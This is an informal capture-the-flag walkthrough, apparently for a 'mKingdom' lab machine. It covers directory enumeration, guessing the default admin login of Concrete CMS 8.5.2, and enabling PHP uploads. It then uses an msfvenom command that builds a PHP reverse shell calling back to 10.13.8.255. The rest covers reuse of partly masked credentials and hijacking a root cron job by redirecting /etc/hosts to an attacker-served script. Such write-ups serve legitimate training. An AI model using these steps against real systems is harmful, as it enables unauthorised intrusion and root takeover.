Starting nmap scan 
```
85 Apache 2.4.7  Ubuntu
```
Starting a nikto scan 

Starting a gobuster scan
```
/app
/app/castle
/app/castle/index.php
/app/castle/login
/app/castle/contact
/app/castle/blog
/app/castle/updates
/app/castle/packages
/app/castle/application
/app/castle/concrete
```

CMS version `concrete 8.5.2` 
Looking around now that we found the real site did same basic looking around found the login page and found what I seen was two possible usernames to try and login in with first one I tried was `admin` since that's the default username for this cms got the login with basic guessing for the admin account
`admin:pa.......` 
 I found a site that shows how to get a rev shell from the admin user which we not got we need to go to `system settings` and go to `allow file tpyes` and a php in there and now we can upload a php shell or php pentest monkey works better
`msfvenom -p php/reverse_php LHOST=10.13.8.255 LPORT=1234 > shell.php` 
Now we got a rev shell on the host as `www-data` found some mysql creds
	`mKingdom:toa......st`
There creds don't work for the database but the passowrd is the same password for the user toad
As the user toad we can access the database nothing much in there but the admin account for the site running linpeas as toad again reveal's something in the environment variables now we are mario
`mario:ika......S` 
If you copy the user flag file out of the home folder we can then read it
Using pspy we can see root has a cronjob running with a `counter.sh` script we cant edit the script but we can edit the `/etc/hosts` file and we changed the domain to call to are machine and make a sh script with a folder path of this 
`mkdir -p app/castle/applocation`
with a rev shell in it and it will be ran as root